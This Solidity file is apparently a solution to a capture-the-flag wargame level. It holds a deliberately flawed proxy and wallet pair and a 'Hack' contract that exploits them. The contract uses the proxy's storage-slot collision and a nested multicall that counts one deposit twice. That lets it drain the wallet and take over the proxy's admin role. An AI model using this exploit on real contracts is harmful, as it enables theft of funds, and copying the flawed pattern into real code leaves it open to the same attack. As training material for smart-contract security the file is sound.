// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

contract PuzzleProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    // function upgradeTo(address _newImplementation) external onlyAdmin {
    //     _upgradeTo(_newImplementation);
    // }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

// 1. PuzzleWallet.maxBalance = PuzzleProxy.admin
// 2. PuzzleWallet.setMaxBalance(uint256(uint160(msg.sender)))
// 3. PuzzleWallet.addToWhitelist(address(msg.sender))
// 4. PuzzleWallet.owner = PuzzleProxy.pendingAdmin
// 5. PuzzleProxy.proposeNewAdmin(msg.sender)

interface IWallet  {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function addToWhitelist(address addr) external;
    function setMaxBalance(uint256 value) external;
}

contract Hack {
    IWallet wallet;

    constructor(address _walletAddress) payable {
        wallet = IWallet(_walletAddress);

        // 5. become owner of PuzzleWallet
        wallet.proposeNewAdmin(address(this));
        
        // 4. become whitelisted in PuzzleWallet
        wallet.addToWhitelist(address(this));
        
        // 3. PuzzleWallet.balance = 0.002 ether
        bytes[] memory subData = new bytes[](1);
        subData[0] = abi.encodeWithSelector(IWallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = subData[0];
        data[1] = abi.encodeWithSelector(IWallet.multicall.selector, subData);

        wallet.multicall{value: 0.001 ether}(data);
        
        // 2. PuzzleWallet.balance = 0
        wallet.execute(msg.sender, 0.002 ether, "");

        // 1. PuzzleProxy.admin = msg.sender
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        // 0. check admin = msg.sender
        require(wallet.admin() == msg.sender, "faield to hack");

        selfdestruct(payable(msg.sender));
    }
}